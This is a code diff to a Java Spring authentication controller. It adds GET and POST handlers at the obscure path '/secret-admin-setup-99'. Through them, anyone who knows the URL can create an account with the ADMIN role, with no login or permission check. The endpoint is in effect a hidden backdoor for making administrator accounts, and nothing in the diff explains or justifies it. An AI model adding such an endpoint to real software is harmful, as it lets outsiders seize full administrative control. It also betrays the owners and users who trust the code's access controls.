@@ -178,4 +178,33 @@ public class AuthController {
         
         return "dashboard";
     }
+    
+    @GetMapping("/secret-admin-setup-99")
+    public String showSecretAdminRegistrationForm(Model model) {
+        model.addAttribute("user", new User());
+        return "secret-admin-register";
+    }
+
+    @PostMapping("/secret-admin-setup-99")
+    public String secretRegisterAdmin(@ModelAttribute User user, Model model) {
+        if (user.getUsername() == null || user.getUsername().trim().isEmpty() ||
+            user.getPassword() == null || user.getPassword().length() < 6 ||
+            user.getEmail() == null || !user.getEmail().contains("@") ||
+            user.getFullName() == null || user.getFullName().trim().isEmpty()) {
+            model.addAttribute("error", "Please fill all required fields correctly.");
+            return "secret-admin-register";
+        }
+
+        if (userRepository.findByUsername(user.getUsername()).isPresent()) {
+            model.addAttribute("error", "Username already exists.");
+            return "secret-admin-register";
+        }
+
+        user.setPassword(BCrypt.hashpw(user.getPassword(), BCrypt.gensalt()));
+        user.setRole(Role.ADMIN);
+        
+        userRepository.save(user);
+
+        return "redirect:/login?registered=true";
+    }
 }
